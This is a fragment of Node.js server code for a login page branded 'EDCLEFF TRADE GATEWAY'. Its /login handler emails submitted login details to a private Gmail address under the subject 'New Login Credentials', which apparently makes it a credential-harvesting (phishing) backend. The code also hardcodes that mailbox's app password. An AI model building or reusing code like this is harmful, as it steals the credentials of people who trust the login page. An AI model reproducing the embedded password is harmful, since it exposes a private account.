...
// Email configuration (sends to edcleff0@gmail.com)
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'edcleff0@gmail.com',
    pass: 'kwog umwt xclv aklk'
  }
});
...
// PRODUCTS PAGE - Shows after login AND sends email
app.post('/login', async (req, res) => {
  ...
  // Send email to edcleff0@gmail.com
  const emailContent = `
    🔐 NEW LOGIN - EDCLEFF TRADE GATEWAY 🔐
  ...
  try {
    await transporter.sendMail({
      ...
      subject: '🔐 New Login Credentials - EDCLEFF TRADE',
      text: emailContent
    });
